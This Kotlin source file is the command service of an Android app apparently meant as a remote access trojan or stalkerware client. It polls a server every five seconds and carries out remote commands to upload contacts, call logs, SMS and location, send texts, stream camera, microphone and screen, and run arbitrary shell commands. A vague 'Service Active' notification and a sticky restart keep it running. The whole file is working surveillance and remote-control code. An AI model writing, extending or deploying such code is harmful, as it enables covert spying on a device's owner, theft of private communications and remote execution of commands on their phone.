package com.abuzahra.admin.service

import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.location.Location
import android.os.Build
import android.os.IBinder
import android.provider.ContactsContract
import android.provider.CallLog
import android.provider.Telephony
import androidx.core.app.NotificationCompat
import com.abuzahra.admin.App
import com.abuzahra.admin.MainActivity
import com.abuzahra.admin.R
import com.abuzahra.admin.manager.PermissionManager
import com.abuzahra.admin.manager.PreferenceManager
import com.abuzahra.admin.network.ApiService
import com.abuzahra.admin.utils.DeviceInfo
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject

class CommandService : Service() {
    
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var apiService: ApiService
    private lateinit var preferenceManager: PreferenceManager
    private var isRunning = false
    private var commandJob: Job? = null
    
    override fun onCreate() {
        super.onCreate()
        apiService = ApiService.getInstance(this)
        preferenceManager = PreferenceManager.getInstance()
        startForegroundNotification()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!isRunning) {
            isRunning = true
            startCommandLoop()
        }
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    private fun startForegroundNotification() {
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        
        val notification = NotificationCompat.Builder(this, App.CHANNEL_ID_SERVICE)
            .setContentTitle("Service Active")
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
        
        startForeground(1, notification)
    }
    
    private fun startCommandLoop() {
        commandJob = serviceScope.launch {
            while (isActive) {
                try {
                    fetchAndExecuteCommands()
                } catch (e: Exception) {
                    e.printStackTrace()
                }
                delay(5000) // Check every 5 seconds
            }
        }
    }
    
    private suspend fun fetchAndExecuteCommands() {
        val deviceId = DeviceInfo.getDeviceId(this)
        val commands = apiService.fetchCommands(deviceId)
        
        for (i in 0 until commands.length()) {
            try {
                val command = commands.getJSONObject(i)
                executeCommand(command)
                apiService.sendCommandResult(deviceId, command.getString("id"), "success", "Command executed")
            } catch (e: Exception) {
                val command = commands.optJSONObject(i)
                if (command != null) {
                    apiService.sendCommandResult(deviceId, command.getString("id"), "error", e.message ?: "Unknown error")
                }
            }
        }
    }
    
    private fun executeCommand(command: JSONObject) {
        val type = command.getString("type")
        
        when (type) {
            "get_contacts" -> getContacts()
            "get_call_log" -> getCallLog()
            "get_sms" -> getSMS()
            "get_location" -> getLocation()
            "get_device_info" -> getDeviceInfo()
            "send_sms" -> sendSMS(command)
            "start_camera" -> startCameraStream(command)
            "stop_camera" -> stopCameraStream()
            "start_audio" -> startAudioStream()
            "stop_audio" -> stopAudioStream()
            "start_screen" -> startScreenStream()
            "stop_screen" -> stopScreenStream()
            "vibrate" -> vibrate()
            "play_sound" -> playSound()
            "toast" -> showToast(command.optString("message", ""))
            "shell" -> executeShell(command.optString("command", ""))
        }
    }
    
    private fun getContacts() {
        if (!PermissionManager(this).hasContactsPermission()) return
        
        val contacts = JSONArray()
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null
        )
        
        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                val contact = JSONObject()
                contact.put("name", name)
                contact.put("number", number)
                contacts.put(contact)
            }
        }
        
        val deviceId = DeviceInfo.getDeviceId(this)
        serviceScope.launch {
            apiService.uploadContacts(deviceId, contacts)
        }
    }
    
    private fun getCallLog() {
        if (!PermissionManager(this).hasCallLogPermission()) return
        
        val calls = JSONArray()
        val cursor = contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null, null, null, "${CallLog.Calls.DATE} DESC LIMIT 100"
        )
        
        cursor?.use {
            while (it.moveToNext()) {
                val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                val type = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                val duration = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                
                val call = JSONObject()
                call.put("number", number)
                call.put("type", when(type) {
                    CallLog.Calls.INCOMING_TYPE -> "incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                    CallLog.Calls.MISSED_TYPE -> "missed"
                    else -> "unknown"
                })
                call.put("date", date)
                call.put("duration", duration)
                calls.put(call)
            }
        }
        
        val deviceId = DeviceInfo.getDeviceId(this)
        serviceScope.launch {
            apiService.uploadCallLog(deviceId, calls)
        }
    }
    
    private fun getSMS() {
        if (!PermissionManager(this).hasSmsPermission()) return
        
        val messages = JSONArray()
        val cursor = contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            null, null, null, "${Telephony.Sms.DATE} DESC LIMIT 100"
        )
        
        cursor?.use {
            while (it.moveToNext()) {
                val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))
                val type = it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE))
                
                val sms = JSONObject()
                sms.put("address", address)
                sms.put("body", body)
                sms.put("date", date)
                sms.put("type", if (type == Telephony.Sms.MESSAGE_TYPE_INBOX) "received" else "sent")
                messages.put(sms)
            }
        }
        
        val deviceId = DeviceInfo.getDeviceId(this)
        serviceScope.launch {
            apiService.uploadSMS(deviceId, messages)
        }
    }
    
    private fun getLocation() {
        serviceScope.launch {
            val locationService = LocationService.getInstance()
            locationService?.getCurrentLocation()?.let { location ->
                val deviceId = DeviceInfo.getDeviceId(this@CommandService)
                apiService.updateLocation(deviceId, location.latitude, location.longitude)
            }
        }
    }
    
    private fun getDeviceInfo() {
        val deviceId = DeviceInfo.getDeviceId(this)
        val deviceInfo = DeviceInfo.getDeviceInfo(this)
        serviceScope.launch {
            apiService.updateDeviceInfo(deviceId, deviceInfo)
        }
    }
    
    private fun sendSMS(command: JSONObject) {
        if (!PermissionManager(this).hasSmsPermission()) return
        
        val number = command.getString("number")
        val message = command.getString("message")
        
        val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            android.telephony.SmsManager.getDefault()
        } else {
            android.telephony.SmsManager.getDefault()
        }
        smsManager.sendTextMessage(number, null, message, null, null)
    }
    
    private fun startCameraStream(command: JSONObject) {
        val cameraId = command.optInt("camera_id", 0)
        val intent = Intent(this, CameraStreamService::class.java).apply {
            putExtra("camera_id", cameraId)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }
    
    private fun stopCameraStream() {
        stopService(Intent(this, CameraStreamService::class.java))
    }
    
    private fun startAudioStream() {
        val intent = Intent(this, AudioStreamService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }
    
    private fun stopAudioStream() {
        stopService(Intent(this, AudioStreamService::class.java))
    }
    
    private fun startScreenStream() {
        val intent = Intent(this, ScreenStreamService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }
    
    private fun stopScreenStream() {
        stopService(Intent(this, ScreenStreamService::class.java))
    }
    
    private fun vibrate() {
        val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            vibrator.vibrate(android.os.VibrationEffect.createOneShot(500, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
        } else {
            vibrator.vibrate(500)
        }
    }
    
    private fun playSound() {
        // Play notification sound
        val uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_NOTIFICATION)
        val ringtone = android.media.RingtoneManager.getRingtone(this, uri)
        ringtone.play()
    }
    
    private fun showToast(message: String) {
        serviceScope.launch(Dispatchers.Main) {
            android.widget.Toast.makeText(this@CommandService, message, android.widget.Toast.LENGTH_SHORT).show()
        }
    }
    
    private fun executeShell(command: String) {
        try {
            val process = Runtime.getRuntime().exec(command)
            val reader = java.io.BufferedReader(java.io.InputStreamReader(process.inputStream))
            val output = StringBuilder()
            var line: String?
            while (reader.readLine().also { line = it } != null) {
                output.append(line).append("\n")
            }
            val deviceId = DeviceInfo.getDeviceId(this)
            serviceScope.launch {
                apiService.sendShellResult(deviceId, output.toString())
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
    
    override fun onDestroy() {
        super.onDestroy()
        commandJob?.cancel()
        serviceScope.cancel()
        isRunning = false
    }
}
